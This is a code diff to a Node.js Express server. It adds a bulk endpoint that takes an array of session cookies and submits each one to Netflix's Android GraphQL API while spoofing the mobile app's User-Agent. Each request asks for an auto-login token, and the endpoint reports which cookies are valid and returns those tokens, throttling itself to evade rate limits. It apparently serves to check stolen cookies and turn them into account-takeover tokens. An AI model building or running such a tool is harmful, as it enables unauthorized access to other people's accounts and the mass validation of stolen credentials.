@@ -69,6 +69,84 @@ app.use('/api/nftoken', (req, res, next) => {
     next();
 });
 
+// --- BULK PROCESSING ENDPOINT ---
+app.post('/api/bulk-nftoken', async (req, res) => {
+    try {
+        const { cookies, hardwareId } = req.body; // Array of cookie objects
+        const userIp = req.ip || req.connection.remoteAddress;
+        
+        console.log(`=== BULK PROCESSING START ===`);
+        console.log(`Device: ${hardwareId}`);
+        console.log(`Total cookies: ${cookies.length}`);
+        
+        const results = [];
+        
+        // Process each cookie one by one
+        for (let i = 0; i < cookies.length; i++) {
+            const cookieData = cookies[i];
+            
+            console.log(`\n📦 Processing cookie ${i + 1}/${cookies.length}`);
+            
+            try {
+                const response = await fetch('https://android13.prod.ftl.netflix.com/graphql', {
+                    method: 'POST',
+                    headers: {
+                        'User-Agent': 'com.netflix.mediaclient/63884 (Linux; U; Android 13; ro; M2007J3SG; Build/TQ1A.230205.001.A2; Cronet/143.0.7445.0)',
+                        'Content-Type': 'application/json',
+                        'Cookie': Object.entries(cookieData).map(([k, v]) => `${k}=${v}`).join('; ')
+                    },
+                    body: JSON.stringify({
+                        operationName: 'CreateAutoLoginToken',
+                        variables: { scope: 'WEBVIEW_MOBILE_STREAMING' },
+                        extensions: { 
+                            persistedQuery: { 
+                                version: 102, 
+                                id: '76e97129-f4b5-41a0-a73c-12e674896849' 
+                            } 
+                        }
+                    })
+                });
+                
+                const data = await response.json();
+                
+                results.push({
+                    index: i,
+                    status: response.status,
+                    success: !!(data.data?.createAutoLoginToken),
+                    token: data.data?.createAutoLoginToken || null,
+                    rawResponse: data
+                });
+                
+                // Small delay to avoid rate limiting
+                await new Promise(resolve => setTimeout(resolve, 500));
+                
+            } catch (error) {
+                results.push({
+                    index: i,
+                    status: 500,
+                    success: false,
+                    error: error.message
+                });
+            }
+        }
+        
+        console.log(`\n=== BULK PROCESSING COMPLETE ===`);
+        console.log(`Successful: ${results.filter(r => r.success).length}/${cookies.length}`);
+        
+        res.json({
+            success: true,
+            total: cookies.length,
+            valid: results.filter(r => r.success).length,
+            invalid: results.filter(r => !r.success).length,
+            results: results
+        });
+        
+    } catch (error) {
+        console.error('Bulk processing error:', error);
+        res.status(500).json({ error: error.message });
+    }
+});
+
 // --- YOUR EXISTING PROXY ENDPOINT ---
 app.post('/api/nftoken', async (req, res) => {
     try {
